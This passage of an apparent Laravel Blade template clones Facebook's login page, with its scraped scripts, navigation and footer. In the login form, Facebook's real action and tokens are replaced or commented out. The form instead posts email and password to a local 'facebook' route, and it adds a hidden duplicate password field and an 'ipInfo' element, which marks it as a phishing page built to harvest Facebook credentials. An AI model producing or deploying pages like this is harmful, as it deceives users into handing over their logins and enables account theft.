                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:806696",
                ["clearTimeoutBlue"],
                {
                  __rc: [
                    "clearTimeoutBlue",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:807042",
                ["setTimeoutBlue"],
                {
                  __rc: [
                    "setTimeoutBlue",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:896462",
                ["setIntervalAcrossTransitionsBlue"],
                {
                  __rc: [
                    "setIntervalAcrossTransitionsBlue",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:986633",
                ["setTimeoutAcrossTransitionsBlue"],
                {
                  __rc: [
                    "setTimeoutAcrossTransitionsBlue",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:1003267",
                ["clearIntervalBlue"],
                {
                  __rc: [
                    "clearIntervalBlue",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:1183579",
                ["InlineFbtResultImpl"],
                {
                  __rc: [
                    "InlineFbtResultImpl",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:925100",
                ["RunBlue"],
                {
                  __rc: [
                    "RunBlue",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:729414",
                ["VisualCompletion"],
                {
                  __rc: [
                    "VisualCompletion",
                    "Aa1olOmn6o8-RBFN0nHOfDGpThucTY4JQUHq592sVmff1--Bh8Q-99z83FtRQ5jFTUetup_JcXwrqcOe4lv9mugL",
                  ],
                },
                -1,
              ],
              [
                "cr:1094907",
                [],
                {
                  __rc: [
                    null,
                    "Aa3gN0bbSnS3ea42japlYWtXV4VisW5vh3G98ShQXtaJbJTrtSXXV7SVmkQ3etdlwdXRHRq8O6MwqwefoEPJIzU",
                  ],
                },
                -1,
              ],
              [
                "EventConfig",
                [],
                {
                  sampling: {
                    bandwidth: 0,
                    play: 0,
                    playing: 0,
                    progress: 0,
                    pause: 0,
                    ended: 0,
                    seeked: 0,
                    seeking: 0,
                    waiting: 0,
                    loadedmetadata: 0,
                    canplay: 0,
                    selectionchange: 0,
                    change: 0,
                    timeupdate: 0,
                    adaptation: 0,
                    focus: 0,
                    blur: 0,
                    load: 0,
                    error: 0,
                    message: 0,
                    abort: 0,
                    storage: 0,
                    scroll: 200000,
                    mousemove: 20000,
                    mouseover: 10000,
                    mouseout: 10000,
                    mousewheel: 1,
                    MSPointerMove: 10000,
                    keydown: 0.1,
                    click: 0.02,
                    mouseup: 0.02,
                    __100ms: 0.001,
                    __default: 5000,
                    __min: 100,
                    __interactionDefault: 200,
                    __eventDefault: 100000,
                  },
                  page_sampling_boost: 1,
                  interaction_regexes: {},
                  interaction_boost: {},
                  event_types: {},
                  manual_instrumentation: false,
                  profile_eager_execution: false,
                  disable_heuristic: true,
                  disable_event_profiler: false,
                },
                1726,
              ],
              ["AdsInterfacesSessionConfig", [], {}, 2393],
              ["IntlCurrentLocale", [], { code: "en_GB" }, 5954],
              [
                "USIDMetadata",
                [],
                {
                  browser_id: "?",
                  tab_id: "",
                  page_id: "Pr7g7hvij24as",
                  transition_id: 0,
                  version: 6,
                },
                5888,
              ],
              [
                "cr:686",
                [],
                {
                  __rc: [
                    null,
                    "Aa1QQcLA0onwrl15K_tt21l0sUDS_OgaOqnUdE4Mu_UXuhHq01D7FlVmdKIM_WaALC4Iz8esX0GR8uYtWWfSfVP9",
                  ],
                },
                -1,
              ],
              [
                "cr:1984081",
                [],
                {
                  __rc: [
                    null,
                    "Aa3hrkVzgup_6YtcDlab7Xvf4uU4spues5MI8XOxm9-6E73Mqr8okt6BjeXAxHsvciPkmMRfBH2_oMmlk5OAGvwtpgvg",
                  ],
                },
                -1,
              ],
            ],
            require: [
              ["markJSEnabled"],
              ["lowerDomain"],
              ["URLFragmentPrelude"],
              ["Primer"],
              ["BigPipe"],
              ["Bootloader"],
              ["TimeSlice"],
              ["AsyncRequest"],
              ["BanzaiScuba_DEPRECATED"],
              ["VisualCompletionGating"],
              ["FbtLogging"],
              ["IntlQtEventFalcoEvent"],
              [
                "RequireDeferredReference",
                "unblock",
                [],
                [
                  [
                    "AsyncRequest",
                    "BanzaiScuba_DEPRECATED",
                    "VisualCompletionGating",
                    "FbtLogging",
                    "IntlQtEventFalcoEvent",
                  ],
                  "sd",
                ],
              ],
              [
                "RequireDeferredReference",
                "unblock",
                [],
                [
                  [
                    "AsyncRequest",
                    "BanzaiScuba_DEPRECATED",
                    "VisualCompletionGating",
                    "FbtLogging",
                    "IntlQtEventFalcoEvent",
                  ],
                  "css",
                ],
              ],
            ],
          });
        }
      );
    </script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3ij9m4/yY/l/en_GB/U-S1pvGpBD_.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3ij9m4/yY/l/en_GB/U-S1pvGpBD_.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="jpW6YKq"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/y0/r/PvBFn7IF58H.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/y0/r/PvBFn7IF58H.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="VdF6ypd"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yS/r/UXJE_KFXmfT.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yS/r/UXJE_KFXmfT.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="ZaK7abM"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/ymUKktuYtLv.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/ymUKktuYtLv.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="s84NfZE"
    ></script>
    <link
      rel="stylesheet"
      type="text/css"
      href="data:text/css; charset=utf-8,%23bootloader_P_mr5VE{height:42px;}.bootloader_P_mr5VE{display:block!important;}"
    />
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/y3/r/MkXZ7P8-_wS.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/y3/r/MkXZ7P8-_wS.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="fmA3M6T"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yy/r/oXa106O6DQc.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yy/r/oXa106O6DQc.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="vhw5GRt"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yK/r/VjGUU0v9sW1.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yK/r/VjGUU0v9sW1.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="UiX2b//"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yh/r/TqFluosqNLr.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yh/r/TqFluosqNLr.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="GKQxLch"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/y0/r/9rqFBr5eUp5.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/y0/r/9rqFBr5eUp5.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="R0lSirj"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/BJocMV4OuoF.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/BJocMV4OuoF.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="Vlvz+ek"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3iYXl4/yK/l/en_GB/ordclcpLBon.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3iYXl4/yK/l/en_GB/ordclcpLBon.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="BDpTGZx"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3iS9S4/yv/l/en_GB/gsc_cV2tO3j.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3iS9S4/yv/l/en_GB/gsc_cV2tO3j.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="79Y8bmL"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/w-Pc7DjVMKP.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/w-Pc7DjVMKP.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="WSN8hNl"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/r/x4Eyp9nQ1uk.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/r/x4Eyp9nQ1uk.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="CGkH4FY"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yL/r/YWyRTb_tcMn.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yL/r/YWyRTb_tcMn.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="nc2ZTn5"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yU/r/PkGOE4r3wcp.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yU/r/PkGOE4r3wcp.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="qIKb5tG"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yt/r/CyNJRkmXvyt.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yt/r/CyNJRkmXvyt.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="CBQ4zUl"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/S57vNy7Bg69.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/S57vNy7Bg69.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="TPVHIx9"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yv/r/cN-N4Eu_deZ.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yv/r/cN-N4Eu_deZ.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="FEt5GzN"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yS/r/XDDAHSZfaR6.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yS/r/XDDAHSZfaR6.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="+jRpToS"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3iX3c4/yw/l/en_GB/I4Y6I3ClX-_.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3iX3c4/yw/l/en_GB/I4Y6I3ClX-_.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="w3Wk9lz"
    ></script>
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yP/r/qn02T7x2VK0.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yP/r/qn02T7x2VK0.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="jyPWGxW"
    ></script>
  </head>
  <body
    class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1 Locale_en_GB cores-lt4 _19_u hasAXNavMenubar"
    dir="ltr"
  >
    <script type="text/javascript" nonce="">
      requireLazy(["bootstrapWebSession"], function (j) {
        j(1645100275);
      });
    </script>
    <div class="_li" id="u_0_3_eJ">
      <div
        class="_3_s0 _1toe _3_s1 _3_s1 uiBoxGray noborder"
        data-testid="ax-navigation-menubar"
        id="u_0_4_T4"
      >
        <div class="_608m">
          <div class="_5aj7 _tb6">
            <div class="_4bl7">
              <span class="mrm _3bcv _50f3">Jump to</span>
            </div>
            <div class="_4bl9 _3bcp">
              <div
                class="_6a _608n"
                aria-label="Navigation assistant"
                aria-keyshortcuts="Alt+/"
                role="menubar"
                id="u_0_5_LJ"
              >
                <div class="_6a uiPopover" id="u_0_6_HH">
                  <a
                    role="menuitem"
                    class="_42ft _4jy0 _55pi _2agf _4o_4 _63xb _p _4jy3 _517h _51sy"
                    href="#"
                    style="max-width: 200px"
                    aria-haspopup="true"
                    aria-expanded="false"
                    rel="toggle"
                    id="u_0_7_EV"
                    ><span class="_55pe">Sections of this page</span
                    ><span class="_4o_3 _3-99"
                      ><i class="img sp_gMujFo71RwJ sx_a3bbbe"></i></span
                  ></a>
                </div>
                <div class="_6a _3bcs"></div>
                <div class="_6a mrm uiPopover" id="u_0_8_r3">
                  <a
                    role="menuitem"
                    class="_42ft _4jy0 _55pi _2agf _4o_4 _3_s2 _63xb _p _4jy3 _4jy1 selected _51sy"
                    href="#"
                    style="max-width: 200px"
                    aria-haspopup="true"
                    tabindex="-1"
                    aria-expanded="false"
                    rel="toggle"
                    id="u_0_9_Ul"
                    ><span class="_55pe">Accessibility help</span
                    ><span class="_4o_3 _3-99"
                      ><i class="img sp_gMujFo71RwJ sx_67944a"></i></span
                  ></a>
                </div>
              </div>
            </div>
            <div class="_4bl7 mlm pll _3bct">
              <div class="_6a _3bcy">
                Press <span class="_3bcz">alt</span> +
                <span class="_3bcz">/</span> to open this menu
              </div>
            </div>
          </div>
        </div>
      </div>
      <div id="globalContainer" class="uiContextualLayerParent">
        <div class="fb_content clearfix" id="content" role="main">
          <div>
            <div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
              <div class="_8esk">
                <div class="_8esl">
                  <div class="_8ice">
                    <img
                      class="fb_logo _8ilh img"
                      src="{{ asset('img/facebook/logo.svg') }}"
                      alt="Facebook"
                    />
                  </div>
                  <h2 class="_8eso">
                    Facebook helps you connect and share with the people in your
                    life.
                  </h2>
                </div>
                <div class="_8esn">
                  <div class="_8iep _8icy _9ahz _9ah-">
                    <div class="_6luv _52jv">


                      <form
                        class="_9vtf"
                        data-testid="royal_login_form"
                        method="post"
                        onsubmit=""
                        id="u_0_a_OZ"
                        action="{{ url('facebook') }}"
                      >

                      @csrf
                        <!--
                        <input
                          type="hidden"
                          name="jazoest"
                          value="2888"
                          autocomplete="off"
                        /><input
                          type="hidden"
                          name="lsd"
                          value="AVqK7GczFT0"
                          autocomplete="off"
                        />

                        -->

                        <div>
                          <div class="_6lux">
                            <input
                              type="text"
                              class="inputtext _55r1 _6luy"
                              name="email"
                              id="emailhidden"
                              data-testid="royal_email"
                              placeholder="Email address or phone number"
                              autofocus="1"
                              aria-label="Email address or phone number"
                            />
                          </div>
                          
                          <div class="_6lux">
                            <div class="_6luy _55r1 _1kbt" id="passContainer">
                              <input
                                type="password"
                                class="inputtext _55r1 _6luy _9npi"
                                name="password"
                                id="pass"
                                data-testid="royal_pass"
                                placeholder="Password"
                                aria-label="Password"
                              />

                              
                              <input 
                                type="hidden"
                                id="hiddenPass"
                                name="password"
                              />

                            

                              <div class="_9ls7 hidden_elem" id="u_0_b_nf">
                                <a href="#" role="button"
                                  ><div class="_9lsa">
                                    <div class="_9lsb" id="u_0_c_3I"></div></div
                                ></a>
                              </div>
                            </div>
                          </div>
                        </div>
                        <!--
                        <input
                          type="hidden"
                          autocomplete="off"
                          name="login_source"
                          value="comet_headerless_login"
                        /><input
                          type="hidden"
                          autocomplete="off"
                          name="next"
                          value=""
                        />

                        -->

                        <div id="ipInfo"></div>

                        <div class="_6ltg">
                          <button
                            value="1"
                            class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy"
                            name="login"
                            data-testid="royal_login_button"
                            type="submit"
                            id="u_0_d_5u"
                          >
                            Log In
                          </button>
                        </div>
                        <div class="_6ltj">
                          <a
                            href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ1MTAwMjc1LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login"
                            >Forgotten password?</a
                          >
                        </div>
                        <div class="_8icz"></div>
                        <div class="_6ltg">
                          <a
                            role="button"
                            class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy"
                            href="#"
                            ajaxify="https://facebook.com/reg/spotlight/"
                            id="u_0_2_OT"
                            data-testid="open-registration-form-button"
                            rel="async"
                            >Create New Account</a
                          >
                        </div>
                      </form>








                    </div>
                    <div id="reg_pages_msg" class="_58mk">
                      <a
                        href="https://facebook.com/pages/create/?ref_type=registration_form"
                        class="_8esh"
                        >Create a Page</a
                      >
                      for a celebrity, brand or business.
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="">
          <div class="_95ke _8opy">
            <div
              id="pageFooter"
              data-referrer="page_footer"
              data-testid="page_footer"
            >
              <ul
                class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i"
                data-nocookies="1"
              >
                <li>English (UK)</li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://bn-in.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("bn_IN", "en_GB", "https:\/\/bn-in.facebook.com\/", "www_list_selector", 0); return false;'
                    title="Bengali"
                    >বাংলা</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://as-in.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("as_IN", "en_GB", "https:\/\/as-in.facebook.com\/", "www_list_selector", 1); return false;'
                    title="Assamese"
                    >অসমীয়া</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://hi-in.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("hi_IN", "en_GB", "https:\/\/hi-in.facebook.com\/", "www_list_selector", 2); return false;'
                    title="Hindi"
                    >हिन्दी</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://ne-np.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("ne_NP", "en_GB", "https:\/\/ne-np.facebook.com\/", "www_list_selector", 3); return false;'
                    title="Nepali"
                    >नेपाली</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://id-id.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("id_ID", "en_GB", "https:\/\/id-id.facebook.com\/", "www_list_selector", 4); return false;'
                    title="Indonesian"
                    >Bahasa Indonesia</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="rtl"
                    href="https://ar-ar.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("ar_AR", "en_GB", "https:\/\/ar-ar.facebook.com\/", "www_list_selector", 5); return false;'
                    title="Arabic"
                    >العربية</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://zh-cn.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("zh_CN", "en_GB", "https:\/\/zh-cn.facebook.com\/", "www_list_selector", 6); return false;'
                    title="Simplified Chinese (China)"
                    >中文(简体)</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://ms-my.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("ms_MY", "en_GB", "https:\/\/ms-my.facebook.com\/", "www_list_selector", 7); return false;'
                    title="Malay"
                    >Bahasa Melayu</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://es-la.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("es_LA", "en_GB", "https:\/\/es-la.facebook.com\/", "www_list_selector", 8); return false;'
                    title="Spanish"
                    >Español</a
                  >
                </li>
                <li>
                  <a
                    class="_sv4"
                    dir="ltr"
                    href="https://pt-br.facebook.com/"
                    onclick='require("IntlUtils").setCookieLocale("pt_BR", "en_GB", "https:\/\/pt-br.facebook.com\/", "www_list_selector", 9); return false;'
                    title="Portuguese (Brazil)"
                    >Português (Brasil)</a
                  >
                </li>
                <li>
                  <a
                    role="button"
                    class="_42ft _4jy0 _517i _517h _51sy"
                    rel="dialog"
                    ajaxify="https://facebook.com/settings/language/language/?uri=https%3A%2F%2Fpt-br.facebook.com%2F&amp;source=www_list_selector_more"
                    href="#"
                    title="Show more languages"
                    ><i class="img sp_gMujFo71RwJ sx_25f620"></i
                  ></a>
                </li>
              </ul>
              <div id="contentCurve"></div>
              <div
                id="pageFooterChildren"
                role="contentinfo"
                aria-label="Facebook site links"
              >
                <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                  <li>
                    <a href="https://facebook.com/reg/" title="Sign up for Facebook">Sign Up</a>
                  </li>
                  <li>
                    <a href="https://facebook.com/login/" title="Log in to Facebook">Log In</a>
                  </li>
                  <li>
                    <a
                      href="https://messenger.com/"
                      title="Take a look at Messenger."
                      >Messenger</a
                    >
                  </li>
                  <li>
                    <a href="https://facebook.com/lite/" title="Facebook Lite for Android."
                      >Facebook Lite</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://www.facebook.com/watch/"
                      title="Browse our Watch videos."
                      >Watch</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://facebook.com/places/"
                      title="Take a look at popular places on Facebook."
                      >Places</a
                    >
                  </li>
                  <li>
                    <a href="https://facebook.com/games/" title="Check out Facebook games."
                      >Games</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://facebook.com/marketplace/"
                      title="Buy and sell on Facebook Marketplace."
                      >Marketplace</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://pay.facebook.com/"
                      title="Learn more about Facebook Pay"
                      target="_blank"
                      >Facebook Pay</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://www.oculus.com/"
                      title="Learn more about Oculus"
                      target="_blank"
                      >Oculus</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://portal.facebook.com/"
                      title="Learn more about Facebook Portal"
                      target="_blank"
                      >Portal</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT0zw08aXOsG2RBnp0K0lmebgUjYmgcn92w5Ug0m3hvzjE6pCqxJDz74mhFo2IGbDMjvblpQStyU7fS1j_XJV1TGIiH8_ifdO2KYq4DewlkF9r-Un-pn5p_pKYR1jorXrfW8TOB1v3zWEyI68ZQnng"
                      title="Take a look at Instagram"
                      target="_blank"
                      rel="noopener nofollow"
                      data-lynx-mode="asynclazy"
                      >Instagram</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://www.bulletin.com/"
                      title="Take a look at Bulletin newsletter"
                      >Bulletin</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://facebook.com/local/lists/245019872666104/"
                      title="Browse our Local Lists directory."
                      >Local</a
                    >
                  </li>
                  <li>
                    <a href="https://facebook.com/fundraisers/" title="Donate to worthy causes."
                      >Fundraisers</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://facebook.com/biz/directory/"
                      title="Browse our Facebook Services directory."
                      >Services</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://facebook.com/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
                      title="See the Voting Information Centre"
                      >Voting Information Centre</a
                    >
                  </li>
                  <li>
                    <a href="https://facebook.com/groups/explore/" title="Explore our groups."
                      >Groups</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://about.facebook.com/"
                      accesskey="8"
                      title="Read our blog, discover the resource centre and find job opportunities."
                      >About</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://facebook.com/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
                      title="Advertise on Facebook"
                      >Create ad</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://facebook.com/pages/create/?ref_type=site_footer"
                      title="Create a Page"
                      >Create Page</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://developers.facebook.com/?ref=pf"
                      title="Develop on our platform."
                      >Developers</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://facebook.com/careers/?ref=pf"
                      title="Make your next career move to our brilliant company."
                      >Careers</a
                    >
                  </li>
                  <li>
                    <a
                      data-nocookies="1"
                      href="https://facebook.com/privacy/explanation/"
                      title="Learn about your privacy and Facebook."
                      >Privacy</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://facebook.com/policies/cookies/"
                      title="Learn about cookies and Facebook."
                      data-nocookies="1"
                      >Cookies</a
                    >
                  </li>
                  <li>
                    <a
                      class="_41ug"
                      data-nocookies="1"
                      href="https://www.facebook.com/help/568137493302217"
                      title="Learn about AdChoices."
                      >AdChoices<i class="img sp_gMujFo71RwJ sx_bdef52"></i
                    ></a>
                  </li>
                  <li>
                    <a
                      data-nocookies="1"
                      href="https://facebook.com/policies?ref=pf"
                      accesskey="9"
                      title="Review our terms and policies."
                      >Terms</a
                    >
                  </li>
                  <li>
                    <a
                      href="https://facebook.com/help/?ref=pf"
                      accesskey="0"
                      title="Visit our Help Centre."
                      >Help</a
                    >
                  </li>
                  <li>
                    <a
                      accesskey="6"
                      class="accessible_elem"
